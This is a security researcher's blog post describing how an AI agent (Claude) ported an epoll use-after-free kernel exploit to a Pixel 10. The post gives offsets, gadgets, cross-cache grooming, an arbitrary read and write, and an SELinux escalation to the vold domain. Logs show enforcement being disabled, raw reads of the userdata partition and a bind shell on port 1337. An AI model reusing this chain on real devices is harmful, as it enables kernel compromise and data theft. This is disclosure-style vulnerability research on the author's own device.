---
title: I handed the epoll UAF to an agent
source: https://guysrd.github.io/epoll-uaf-agent
source_host: guysrd.github.io
clip_date: 2026-09-24T10:22:44+08:00
trace_id: 7a527e31-963a-4cbb-8e87-de41622f7b77
content_hash: 6a7a062896e129fab3b09fa6f46acdfc5bc8ca26fe10d47d670a85c595e3a16e
status: synced
tags:
  - 漏洞分析
  - AI辅助逆向
series: null
feed_source: guysrd·Android/Linux内核
ai_summary: 用一个自主 AI 代理把 epoll UAF（CVE-2026-46242）的 x86 PoC 移植到 Pixel 10，拿到读原语并提权到 vold SELinux 域。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e575244-d011-8111-806b-f1f960be754a
ioc:
  cves:
    - CVE-2026-46242
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 用一个自主 AI 代理把 epoll UAF（CVE-2026-46242）的 x86 PoC 移植到 Pixel 10，拿到读原语并提权到 vold SELinux 域。
> 
> - **漏洞原语：** `__ep_remove` 裸用 `epi->ffd.file` 却没有 `epi_fget()` pin 引用，竞态 close 释放 struct file 得到悬垂 `file*`；再由 `ep_show_fdinfo` 读回 `file_inode(...)->i_ino`，形成真正的任意读——比上篇 graph-walker 的盲目写强得多。
> - **缓解绕过：** 面对 kCFI、`init_on_free`、`BUG_ON_DATA_CORRUPTION`、禁用 `perf_event_open`/`add_key`、`RLIMIT_NOFILE=32768`；KASLR 借 ARM64 线性映射固定别名（`0xffffff8000000000+(sym-_text)`）绕过并用 `kimage_vaddr` 还原 text 基址；fork 持约 90 万个 struct file 突破 fd 上限完成 filp 跨缓存回收，再用可 mmap 的 dma-buf 页当可实时改写的假 file。
> - **读写原语：** 读把假 `f_inode` 指向 `X-0x40`，fdinfo 打印的 ino 即 `*(X)`（用 `init_task.comm=="swapper/0"` 自证）；写把假 `f_op->poll=swaps_poll`（真实 poll 满足 kCFI）把全局 `proc_poll_event` 写到 `*(target)`，并预置 eventfd 把悬垂 epitem 挂上 rdllist 才能触发。
> - **提权收尾：** 清零 cred 后，用递增 gadget 把 `proc_poll_event` 加到 vold 的 SID（756），写入 `task_security_struct.sid`，进程转为 `u:r:vold:s0`。
> - **代理表现与局限：** 偏移、fork-hold、递增 gadget、反汇编查错全由代理完成；但两次误判跨缓存不可行、一度误信“已修补”，仅靠两次人工纠偏（改用 dma-buf、以读闸写）；成功率约 30%，整体约 48 小时。

In [the last post](https://guysrd.github.io/epoll-uaf) I burned a few weeks on Nicholas’s epoll graph-walker UAF, got a constrained write but I never turned it into anything. That bug was a *blind* write into a freed `eventpoll` and I did not try to turn it into an infoleak, so the only strategy I had was PTE corruption and the timing never lined up.

So I did something a little different. I took a *sibling* bug in the same file, pointed Claude at my Pixel 10 over adb, and let it drive. **Everything below the entire port to Frankel, every offset, the whole exploit chain up to a root shell in the `vold` SELinux domain was done by the agent, not by me.** I set the goal, kept it honest, and steered twice. This post is what it did, where it went differently than I did, and the parts where I had to yank the leash. I gave Claude the bad epoll x86 repo and let it steer away, there was no Android implementation because the methods, objects, leaks and statistics were not targeted to a hardened environment like Android, so several modifications had to be done in order to make it work. I also think it is still possible to exploit this bug leaklessly and thus gain better statistics, but I leave this stage to the user to implement.

The agent’s job was the *port*. Take a working exploit for one kernel and make it fire on a very different, very hardened one. That’s less glamorous than finding the bug and much harder than it sounds, which is most of the story.

LLM Technical summary Port of Bad Epoll (CVE-2026-46242, the \`\_\_ep\_remove\` variant. \`epi->ffd.file\` used without an \`epi\_fget()\` pin, distinct from the graph-walker \`kfree(ep)\` bug) from an existing x86/arm64 PoC to a Pixel 10 "frankel" (6.6.102-android15, kCFI enforcing, \`CONFIG\_BUG\_ON\_DATA\_CORRUPTION=y\`, \`init\_on\_free=1\`, SELinux Enforcing, no \`perf\_event\_open\`, no \`add\_key\`). Chain: linear-map KASLR defeat → \`filp\` cross-cache to buddy (mass-free, \`RLIMIT\_NOFILE=32768\` beaten by fork-holding ~900k struct files, signal = \`/sys/kernel/slab/filp/slabs\` because the \`discard\_slab\` kprobe undercounts) → reclaim the freed \`struct file\` with a user-mmap'd dma-buf page (live-editable fake file) → \`ep\_show\_fdinfo\` arbitrary read via fake \`f\_inode\` → fake \`f\_op->poll = swaps\_poll\` arbitrary write, fired by polling the survivor epoll (dangling epitem forced onto \`rdllist\` via a pre-armed eventfd), gated behind a confirmed read so a reclaim miss retries instead of panicking → zero \`cred\` → increment \`proc\_poll\_event\` to vold's SID (755) → write it into \`task\_security\_struct.sid\` → \`u:r:vold:s0\`. Flaky (~30%, reboot-prone) on purpose. Done by an autonomous agent under human supervision.

## Same corner, different door

The graph walker bug and this one lived in the same pattern. The symptom is the same, but this bug provides a stronger primitive.

```sql
   the graph-walker bug (last post)            bad epoll
   --------------------------------            ---------------------------------------
   ep_get_upwards_depth_proc() walks a         __ep_remove() reads epi->ffd.file WITHOUT
   freed eventpoll and WRITES loop_check_gen     pinning it (no epi_fget); a racing close
   into it                                       frees that struct file underneath it
     -> blind write, nothing reads back           -> a dangling struct file *
     -> only one-shot is PTE corruption         ep_show_fdinfo() READS epi->ffd.file back
     -> timing never lined up (my post)            -> a genuine infoleak / arbitrary read
```

`__ep_remove` uses the watched file pointer bare (`fs/eventpoll.c:724`, `file = epi->ffd.file;` with no `atomic_long_inc_not_zero` on `f_count`). The complete fix pins it. `epi_fget()` at `:899` exists in the tree, but it’s only called from `ep_item_poll` at `:914`, *not* from `__ep_remove`. Frankel has the earlier, incomplete fix and not this one. The agent verified that by disassembling the device’s own `__ep_remove` before it trusted a single line of source.

The consequence is everything. My bug could only *write*. This one hands you a **read** through a completely legitimate path, `/proc/self/fdinfo/<epfd>`. Once you can read kernel memory, KASLR is a formality and the rest is plumbing. So the agent’s path and mine diverge at the very first step. It never needed the PTE gamble I lost on, because it got to read first.

## What “porting” actually meant

The x86 PoC assumes a friendly world. Frankel is a hardened environment. Before any of the old code could run the agent had to re-derive the exploit against this device’s mitigations. It pulled every constant from the device’s own BTF (`/sys/kernel/btf/vmlinux`):

-   **`CONFIG_BUG_ON_DATA_CORRUPTION=y`**. A corrupt `list_del` is a hard `BUG()`, not a warning. This killed the “obvious” eventpoll write path outright (more below).
-   **`init_on_free=1`**. Freed memory is zeroed, so no stale-pointer infoleaks fall out of a UAF.
-   **kCFI enforcing**. You cannot call an arbitrary address through a function pointer. The callee needs a matching type hash. That constrains the write gadget hard.
-   **`SLAB_FREELIST_RANDOM` + `SHUFFLE_PAGE_ALLOCATOR`**. Heap and page grooming are probabilistic.
-   **No `perf_event_open`, no `add_key`**. The two KASLR/leak primitives every public writeup reaches for are denied to our domain by policy.
-   **`RLIMIT_NOFILE = 32768`**. A hard cap on how much of the `filp` cache one process can hold.

None of that is in the original exploit. All of it had to be measured and worked around.

## KASLR with nothing

As I was targeting the Frankel device, KASLR base was not randomized there. We remember this from [P0’s post](https://projectzero.google/2025/11/defeating-kaslr-by-doing-nothing-at-all.html).

The agent used the ARM64 linear map. `_text` loads at physical `memstart_addr == 0x80000000`, so *every* kernel symbol is also readable at a **fixed** alias `0xffffff8000000000 + (sym - _text)`, regardless of the KASLR slide. It confirmed this with a kprobe. `init_task.comm` reads `"swapper/0"` byte-for-byte at the linear alias and at the randomized kimage address. Then it recovers the runtime text base for gadgets with a single read of `kimage_vaddr`. This part it got right on the first try and never revisited.

## Cross caching the filp object to a general cache

To use `ep_show_fdinfo` as an arbitrary read you need to reclaim the freed `struct file` with a *fake* one you control. That means getting the victim’s `filp` slab page all the way back to the buddy allocator, then catching the page. This is the step that ate the most time, and it’s the most honest part of the story, so here’s how it actually went.

**The agent decided twice that filp cross-cache was impossible on this device.** Both times it was measuring wrong.

-   First it set a `discard_slab` kprobe that read `s->name` as a direct string instead of dereferencing the `char *`. Every cache name came back as garbage. `grep filp` matched nothing. The verdict was “0 discards, blocked.”
-   Then it re-measured, saw ~11 filp discards, declared cross-cache *viable*. Then a sub-agent’s own **negative control** (a run that frees nothing) showed those 11 were ambient RCU-thread noise, not its doing. The verdict flipped back to “blocked.”

I had to fight Claude many times to push them hard that it is possible. Most of the time it failed and hallucinated, and said it is impossible to cross cache on the Frankel device. I kept steering it toward dma-buf and cross-caching, and would not let it give up, until it worked.

The thing that finally broke it open was disassembling the kernel. There is exactly **one** `bl discard_slab` in the whole image. `__unfreeze_partials` and `deactivate_slab` *inline* the discard, so a kprobe on `discard_slab` is structurally blind to precisely the paths a mass-free flows through. The real signal was sitting in plain sight the whole time. `/sys/kernel/slab/filp/slabs` (== slabinfo `num_slabs`) only ever moves via `dec_slabs_node` inside `discard_slab`.

With the right signal, the second problem surfaced. `RLIMIT_NOFILE = 32768`. One process can’t hold enough of the cache to dominate it. The agent beat that by **fork-holding**. Fork N children, each opening ~32k files in its own fd table, until it held **~900,000** struct files at once (`/proc/sys/fs/file-nr` = 936,160). Then it mass-freed ~28,500 pure-attacker files in one shot:

```haskell
    filp cache (order-1, 25 objs/slab)              buddy               dma-buf spray
    +----+----+--------+----+- - -+----+
    | f0 | f1 | VICTIM | f3 | ... | f24|  --.  close all 25
    +----+----+--------+----+- - -+----+    |  (+ 28,500 more, fork-held)
                                            '------------------------>  page --DMA_HEAP_ALLOC-->
                                               num_slabs 2389 -> 1029      [ fake struct file ]
```

From an actual run:

```
[aar] cc=1 CROSS-CACHE num_slabs: start=2389 min=1029 now=1133 (min-delta -1360;
      large negative => victim region -> buddy) filp_free 7306->0
```

~1,360 slabs (≈2,700 pages) hit the buddy allocator on that free. The prior “blocked” verdicts weren’t the kernel being clever. They were the agent measuring with a broken ruler. It got there, but I want it on the record that it was wrong, out loud, before it was right.

## dma-buf, and the one steer that mattered

This is where I stepped in. The old exploit reclaims the freed page with **pipe pages**. You write your fake file once and you’re stuck with it. I told the agent to try dma-buf instead. `/dev/dma_heap/system` is openable from `shell` and allocations come straight from buddy. This heap has no page pool on Frankel. It calls `alloc_pages` / `__free_pages` directly (see `system_heap.c`). The point is you `mmap` it, so the fake `struct file` stays **live-editable from userspace after it lands.** You can re-aim its `f_inode` between reads, or flip it from a read payload to a write payload, without re-racing. That single change is what made both primitives practical on the same landed page.

## The read

`ep_show_fdinfo` (`fs/eventpoll.c:942`) prints, per watched item, `file_inode(epi->ffd.file)->i_ino`. Our `epi->ffd.file` is now a fake file whose `f_inode` we choose. Point it at `X - 0x40` (that’s `i_ino` ’s offset, `INODE_I_INO`), read the fdinfo, and the printed `ino` *is* `*(X)`. Arbitrary read, through a `/proc` file, no exploit-looking syscalls at all.

The agent proved it against a known value, `init_task.comm`, which must read `"swapper/0"`:

```rust
[aar] cc=1 reading /proc/self/fdinfo/24010 (ep_show_fdinfo -> file_inode(epi->ffd.file)->i_ino)
[aar]   fdinfo: ... ino:2f72657070617773 sdev:0
[aar] cc=1 fdinfo i_ino = 0x2f72657070617773  bytes='swapper/'  (expected 'swapper/')
```

`0x2f72657070617773` little-endian is `"swapper/"`. That is `init_task.comm[0..7]` byte for byte. It then re-aimed the *same* dma-buf page to `comm+8` and read `"0"`, reconstructing the full `"swapper/0"`.

## The write

The read was good, but I still needed a write, and kCFI makes that awkward. You can’t just point a function pointer anywhere u want. The gadget the exploit uses is **`swaps_poll`**, the `->poll` handler for `/proc/swaps`. It does, in essence:

```
    *(u32 *)(seq_file->private_data + 0x70) = proc_poll_event;
```

Because it *is* a real `->poll`, calling it through a fake `f_op->poll` satisfies kCFI. Set the fake file’s `f_op` to a table we control (in the same dma-buf page), point `->poll` at `swaps_poll`, set `private_data = target - 0x70`, and one poll writes the global `proc_poll_event` to `*(target)`. Zero `proc_poll_event` first (via the same gadget, unaligned) and you get a write-0-anywhere primitive.

Two things had to be solved to actually fire it, and this is where the agent’s first `--root` attempts just *panicked the device* while the read-only self-test ran flawlessly. That asymmetry is the whole trick, and it took me watching it crash-loop to see it.

**1\. The trigger.** `swaps_poll` only runs if `epoll_wait(epA)` reaches `ep_item_poll(epiA) → vfs_poll(fake file)`, and that only happens if the dangling epitem is on `epA` ’s ready list. The agent’s fix was to add, before freezing, `epoll_ctl(ADD)` on a **pre-armed, readable eventfd** so `ep_poll_callback` links `epiA` onto `rdllist`. Verified live:

```
[root] rdllist.next=ffffff88a8607c18 &epiA.rdllink=ffffff88a8607c18 => epiA IS ON epA->rdllist
```

**2\. Gate the write on a read.** The read sink (`ep_show_fdinfo`) is pure loads. On a reclaim miss it reads a real file’s inode, prints garbage, no crash. The write sink is an **indirect call** through `f_op->poll`. On a miss it jumps through a wrong pointer and the kernel panics. The reclaim is probabilistic (due to CONFIG_SHUFFLE_PAGE_ALLOCATOR), so misses are the *common* case. `--root` was firing the poll without checking. My note to it was one line. *Never poll on a miss.* It added `confirm_and_poll`, which does the fdinfo read first and only fires `swaps_poll` if the read still returns `"swapper/"` (proof the fake file is in place), otherwise it retries the cross-cache. That converted a crash-loop into a converging loop:

```
   epoll_wait(epA)                         still uid=2000 here
     ep_item_poll(epiA)                    reached only via rdllist (the eventfd)
       vfs_poll(epiA->ffd.file)            our fake file, on the dma-buf page
         f_op->poll(file)  == swaps_poll   a real ->poll, so kCFI is satisfied
           *(cred.uid - 0x70 + 0x70) = proc_poll_event(=0)
                                           => cred.uid = 0
```

Walking the cred fields one poll at a time, live:

```
[root] GATE proc_poll_event(benign global) 1 -> 0 (want 0) poll_fired=1
[root] *** WRITE PRIMITIVE CONFIRMED on device (benign target changed) ***
[frk] epoll_wait uid   ... uid=0 euid=2000 ...
[frk] epoll_wait euid  ... uid=0 euid=0 gid=0 egid=0
   ... suid/sgid/fsuid/fsgid + all five capability sets -> 0 ...
[frk]   Uid:  0  0  0  0
[frk]   CapEff: 0000000000000000
[frk] child pid=4258 setresuid(0,0,0)=0 -> uid=0 euid=0 gid=0 egid=0
uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
```

## Post-exploitation

However, root is pointless on Android. SELinux and DAC prevent u from doing anything, u need a very strong SELinux context and a strong capability to read sensitive data.

Under SELinux the check is on your **domain**, not your uid. I picked vold as a target SELinux context just because it seemed strong. This means writing vold’s SID into our `task_security_struct.sid` (`cred->security`, `+0x80`; `sid` at `+0x4`).

`swaps_poll` only writes whatever `proc_poll_event` happens to hold, and the only value we can make it hold deterministically is 0. A SID is a specific small integer, vold’s is **755**. So the agent built an **increment gadget**. Bump `proc_poll_event` up to 755 with repeated fires, then use the 4-byte `swaps_poll` write to plant it in `sid`:

```
[vold] incr(ppe->vold_sid): target=ffffff800233e280 start=0 want=755
[vold] incr: round 0 fired 128, target 0 -> 128 (want 755)
```

Land 755 in `task_security_struct.sid` and the same process is now `u:r:vold:s0`, and the `open()` that failed above succeeds. That’s the finish line. Not `uid=0`, but a shell in a domain that means something.

Here’s the full log of the chain:

```
[frk] uid=2000 pid=9783 linear_base=ffffff8000000000
[aar] selftest: pressure=24000 cc_iters=5 dmabuf=64/round x60KB rounds=100 round_us=2000 use_pipes=0 no_read=0
[aar] NOFILE cur=32768 max=32768
[aar] dma_heap/system fd=8
[root] readiness eventfd=9 armed (count=1)
[aar] cc=1 pressure_open=24000 filp_free=0 num_slabs=2428
[aar] cc=1 WON after 84 retries. epA=24010. dangling-epitem oracle:
  pos:  0
flags:  02
mnt_id: 12
ino:    43
tfd:    24011 events:       19 data:                0  pos:0 ino:2b sdev:d

[aar] cc=1 WON->crosscache: freed enclosing+pressure; AAR target init_task.comm @0xffffff800210eab0 (fake f_inode=0xffffff800210ea70)
[aar] cc=1 round 0/100: filp num_slabs=2050 (min 2050, start 2751, delta -701) dmabuf_pages~=960
[aar] cc=1 round 50/100: filp num_slabs=1601 (min 1601, start 2751, delta -1150) dmabuf_pages~=48960
[aar] cc=1 round 99/100: filp num_slabs=1720 (min 1601, start 2751, delta -1150) dmabuf_pages~=96000
[aar] cc=1 CROSS-CACHE num_slabs: start=2751 min=1601 now=1720 (min-delta -1150; large negative => victim region -> buddy) filp_free 0->0
[aar] cc=1 POLL-PROBE epoll_wait rc=1 => f_count present (reclaim landed) — safe to read
[aar] cc=1 reading /proc/self/fdinfo/24010 (ep_show_fdinfo -> file_inode(epi->ffd.file)->i_ino) ...
[aar]   fdinfo: pos:    0
flags:  02
mnt_id: 12
ino:    43
tfd:    24011 events:       19 data:                0  pos:0 ino:2f72657070617773 sdev:0

[aar] cc=1 fdinfo i_ino = 0x2f72657070617773  bytes='swapper/'  (expected init_task.comm[0..7] = 0x2f72657070617773 'swapper/')

[aar] ================= SELFTEST RESULT (cc=1) =================
[aar]  AAR via /proc/self/fdinfo/24010 on survivor epoll epA (dangling epitem)
[aar]  read #1  fake f_inode=&init_task.comm-64  -> i_ino=0x2f72657070617773 bytes='swapper/' (init_task.comm[0..7])
[aar]  read #2  fake f_inode=&init_task.comm+8-64-> i_ino=0x0000000000000030 bytes='0' (init_task.comm[8..15])
[aar]  reconstructed init_task.comm = "swapper/0"
[aar]  KNOWN kernel value init_task.comm = "swapper/0" (bytes 73 77 61 70 70 65 72 2f 30)
[aar]  *** SUCCESS: fdinfo arbitrary-read leaked init_task.comm; i_ino == "swapper/" (byte-identical to comm[0..7]) ***
[aar] ===========================================================

[vold] =============== SELinux DOMAIN TRANSITION -> u:r:vold:s0 ===============
[root] locate: victim confirmed dma-buf-backed; binary-searching 6400 bufs...
[root] pinned victim dma-buf idx=87/6400 (confirm i_ino=0x2f72657070617773 OK)
[vold] locating my task (comm=frk_voldpwn)...
[vold] my task=ffffff88cd8a3840 comm='frk_voldpwn'
[frk] kimage_vaddr=ffffffed60000000 sys_call_table[0]=ffffffed60437b9c
[frk] text base VERIFIED (sys_call_table[0] == _text+0x437b9c)
[frk] runtime _text=ffffffed60000000 swaps_poll=ffffffed6037663c
[vold] cred=ffffff899d52d3c0 real_cred=ffffff899d52d3c0 selinux_blob_sizes.lbs_cred=0 (selinux_cred=cred->security+0)
[vold] MY(cred)      tsec@ffffff80026e1a80 osid=2148 sid=2148 exec_sid=0 create_sid=0 keycreate_sid=0 sockcreate_sid=0
[vold] MY(real_cred) tsec@ffffff80026e1a80 osid=2148 sid=2148 exec_sid=0 create_sid=0 keycreate_sid=0 sockcreate_sid=0
[vold] locating vold task by pid=455 (flat init_task.tasks walk)...
[vold] flat walk: pid=455 found at ffffff80049512c0 comm='binder:4' (visited 242)
[vold] vold task=ffffff80049512c0 comm='binder:455_2'
[vold] VOLD          tsec@ffffff802c005bc0 osid=95 sid=756 exec_sid=0 create_sid=0 keycreate_sid=0 sockcreate_sid=0
[vold] dangling_file=ffffff8942281180 (page-off 180) epiA IS ON epA->rdllist => swaps-write IS reachable
[vold] BEFORE: /proc/self/attr/current = 'u:r:shell:s0'

[vold] ===== T1: dma_buf_poll increment scratch proof (proc_poll_event) =====
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=2000 euid=2000 gid=2000 egid=2000
[vold] proc_poll_event=0
[vold] incr(scratch_ppe): target=ffffff800233e280 start=0 want=256 (need +256 fires)
[vold] incr(scratch_ppe): round 0 fired 128, target 0 -> 128 (want 256)
[vold] incr(scratch_ppe): round 1 fired 128, target 128 -> 256 (want 256)
[vold] T1 scratch: proc_poll_event -> 256 (want 256) => *** VALUE-WRITE PRIMITIVE PROVEN ***

[vold] ===== T1.5: selinux_state.enforcing = 0 (global permissive) =====
[vold] enforcing dword before=01010101 (enforcing byte=1)
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=2000 euid=2000 gid=2000 egid=2000
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=2000 euid=2000 gid=2000 egid=2000
[vold] proc_poll_event=0
[vold] incr(ppe->1(enforcing)): target=ffffff800233e280 start=0 want=1 (need +1 fires)
[vold] incr(ppe->1(enforcing)): round 0 fired 1, target 0 -> 1 (want 1)
[root] confirm_and_poll(zero_enforcing): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_enforcing rc=1 errno=0 uid=2000 euid=2000 gid=2000 egid=2000
[vold] T1.5 enforcing dword after=01010100 (enforcing byte=0) write=fired => *** PERMISSIVE (getenforce=Permissive) ***
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=2000 euid=2000 gid=2000 egid=2000
[vold] proc_poll_event=0
[root] confirm_and_poll(uid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait uid rc=1 errno=0 uid=0 euid=2000 gid=2000 egid=2000
[root] confirm_and_poll(gid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait gid rc=1 errno=0 uid=0 euid=2000 gid=0 egid=2000
[root] confirm_and_poll(euid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait euid rc=1 errno=0 uid=0 euid=0 gid=0 egid=2000
[root] confirm_and_poll(egid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait egid rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(fsuid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait fsuid rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(fsgid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait fsgid rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[vold] after uid zero: getuid=0 geteuid=0

[caps] ===== grant cap mask 0x7ff into cred=ffffff899d52d3c0 (vold) =====
[caps] cap_bset=8000c0 securebits=0000002f (SECURE_NOROOT=1) -> full-caps-via-securebit NOT viable (bset limited; high cap bits unreachable via +1)
[vold] proc_poll_event=0
[vold] incr(ppe->capmask): target=ffffff800233e280 start=0 want=2047 (need +2047 fires)
[vold] incr(ppe->capmask): round 0 fired 128, target 0 -> 128 (want 2047)
[vold] incr(ppe->capmask): round 1 fired 128, target 128 -> 256 (want 2047)
[vold] incr(ppe->capmask): round 2 fired 128, target 256 -> 384 (want 2047)
[vold] incr(ppe->capmask): round 8 fired 128, target 1024 -> 1152 (want 2047)
[vold] incr(ppe->capmask): round 15 fired 127, target 1920 -> 2047 (want 2047)
[root] confirm_and_poll(cap_permitted): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait cap_permitted rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(cap_inheritable): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait cap_inheritable rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(cap_ambient): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait cap_ambient rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(cap_effective): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait cap_effective rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[caps] AAR after grant: prm=7ff inh=7ff amb=7ff eff=7ff (want low=0x7ff)
[caps] *** CAP MASK SET in permitted+inheritable+ambient+effective (survives execve via ambient) ***
frk_vold: [vold] DEMO(BEFORE uid0+shell): open(/dev/block/by-name/userdata)=6411 OK  pread=512 errno=0  <-- vold-domain capability

[vold] ===== T4: tsec.sid 2148 -> 756 (vold), via ppe-increment + swaps-copy =====
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[root] confirm_and_poll(zero_ppe): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait zero_ppe rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[vold] proc_poll_event=0
[vold] incr(ppe->vold_sid): target=ffffff800233e280 start=0 want=756 (need +756 fires)
[vold] incr(ppe->vold_sid): round 0 fired 128, target 0 -> 128 (want 756)
[vold] incr(ppe->vold_sid): round 1 fired 128, target 128 -> 256 (want 756)
[vold] incr(ppe->vold_sid): round 2 fired 128, target 256 -> 384 (want 756)
[vold] incr(ppe->vold_sid): round 5 fired 116, target 640 -> 756 (want 756)
[vold] proc_poll_event incremented to 756 (want vold sid 756)
[root] confirm_and_poll(swaps_copy_ppe_to_sid): read-confirmed (swapper/); firing swaps_poll...
[frk] epoll_wait swaps_copy_ppe_to_sid rc=1 errno=0 uid=0 euid=0 gid=0 egid=0
[vold] AAR after swaps-copy: tsec.sid=756 exec_sid=0 (want sid=756)
frk_vold: [vold] ===== T5: VERIFY (pid=9783) =====
frk_vold: [vold] /proc/self/attr/current = 'u:r:vold:s0'
frk_vold: [vold] AAR tsec.sid = 756 (vold sid = 756) => MATCH
frk_vold: [vold] independent check: adb shell su -c 'cat /proc/9783/attr/current'
frk_vold: [vold] DEMO(AFTER uid0+vold): open(/dev/block/by-name/userdata)=6411 OK  pread=512 errno=0  <-- vold-domain capability
frk_vold: [vold] *** SUCCESS: transitioned to u:r:vold:s0 (real /proc/self/attr/current) ***
frk_vold: ================= FRK VOLD SHELL =================
frk_vold: delivering shell as uid=0 euid=0 gid=0 ctx=u:r:vold:s0 pid=9783
frk_vold: output channel = logcat (su-free): adb shell logcat -s frk_vold:*  [also mirrored to dmesg]
frk_vold: [proof] [proof] id      = uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:vold:s0
frk_vold: [proof] [proof] id -Z   = u:r:vold:s0
frk_vold: [proof] [proof] context = u:r:vold:s0
frk_vold: [proof] [vold-only] ls -laZ /dev/block/by-name/userdata:
frk_vold: [proof] lrwxrwxrwx 1 root root u:object_r:block_device:s0  16 2026-07-12 19:54 /dev/block/by-name/userdata -> /dev/block/sda35
frk_vold: [proof] [vold-only] raw read of userdata partition (shell domain is denied this):
frk_vold: [proof]  69 94 cc 37 3a 84 a8 70 43 66 e3 55 3f 05 06 dc
frk_vold: [proof]  f1 97 0b 76 e0 32 e0 ca d8 b5 b2 51 02 2d 14 01
frk_vold: [proof] [vold-only] READ_OK: vold read raw userdata bytes
frk_vold: [stdin-probe] read(fd0='socket:[85072]') r=-1 errno=11 (Try again) -- EACCES => SELinux denies vold reading the adb stdin socket (avc in dmesg); no runtime input channel exists.
frk_vold: --shell: serving a REAL interactive /system/bin/sh over TCP as vold on 127.0.0.1:1337; epA held open by this pid=9783. enforcing was zeroed pre-bind so vold's missing tcp_socket allow does not block. Connect from the host:  adb forward tcp:1337 tcp:1337 && nc 127.0.0.1 1337
frk_vold: [bindsh] *** LISTENING as vold on 127.0.0.1:1337 ***  host:  adb forward tcp:1337 tcp:1337 && nc 127.0.0.1 1337
frk_vold: [bindsh] client connected -> spawning /system/bin/sh -i as vold on the socket
```

## A word about reliability

The finished exploit is flaky and unstable. On a bad reclaim it panics, the device reboots, you try again. The agent got it from roughly 10% to 30% per attempt and I stopped it there deliberately. The remaining unreliability is *inherent*. It’s the probabilistic page reclaim fighting `SHUFFLE_PAGE_ALLOCATOR` and a busy device, and grinding it toward 100% would mean either privileged tricks (`SCHED_FIFO`, which defeats the “unprivileged” premise) or a lot of effort spent proving a point that’s already proven. A research exploit that fires one time in three and reboots the other two has demonstrated everything it needs to. I’d rather it stay honestly flaky than pretend to be a weapon. I managed to run it w/o crashes after booting the Frankel device and waiting a minute or two.

## How it actually went

The part I find more interesting than the exploit. This ran as a supervised autonomous agent over a long session, long enough that its context was compacted and resumed mid-exploit more than once, with a fleet of sub-agents doing the heavy on-device experiments in parallel:

```lua
   b5gyneegw          discard_slab kprobe / churn experiment
   af46662586...      first filp cross-cache grooming        (~26 min)
   ad8f86a181...      SCM/fork cross-cache, the "kprobe undercounts" breakthrough  (~30 min)
   a84a25f580...      fdinfo AAR via dma-buf, first arbitrary read  (~63 min)
   a3bc23a626...      the write -> root agent
```

Roughly two hours of sub-agent wall-clock just to reach the read, plus the main agent’s own recon between spawns. It was not a straight line, and it was not trustworthy without a leash.

-   At one point it **drifted into insisting the bug didn’t exist**. A sub-agent had “verified” the device was patched and it believed the report. It was wrong. The sub-agent had checked the wrong fix. I compacted the session with a single correction (“the device isn’t patched, continue”) and it recovered and re-verified against the binary. Left alone, it would have confidently written up a non-result.
-   It twice declared cross-cache impossible, as above.
-   I kept it on a short leash on hygiene, too. *“why are there two files?”*, *“commit before you delete,”* *“don’t hallucinate.”* Half my messages were bookkeeping, not insight.

The two moves that actually changed the outcome were both small. **“try dma-buf for the reclaim”** and **“gate the write on the read.”** Everything else the agent did on its own. The offsets, the fork-hold, the increment gadget, the disassembly that caught its own broken kprobe. It even caught its own mistakes when I made it show its work.

## Closing words

tbh, I’m pretty amazed the agent managed to do this. However, I do not think it would manage to do this from scratch. It had the bad epoll implementation on x86 already ready, it knew how to use the leak and I guided the agent to use dmabufs to reclaim the filp object back to the generic cache. The atomic inc idea came after I asked the agent to look for increment primitives that allow us. It steered easily and comfortably without many hallucinations, I was shocked. There were a few times I had to steer it back at the right direction, but overall this was a total 48h work. I just let it run and went to bed.

The graph-walker bug from last post is still unexploited by the agent, perhaps me or someone else should try to exploit it too.

I hope you enjoyed this journey. It made me realize LLMs are not fully autonomous but given a simple researcher like me they can greatly multiply ones force. I had a lot of ideas on exploiting this issue and the agent could simply execute them, so I could experiment easily.

I believe we are entering a stage where LLMs are unvaoidable for vulnerability research. They won’t find u a surface to look at without prior knowledge or help (which poses a gap only a few places can solve) but they will def make it easy to experiment with different directions. One direction will work.
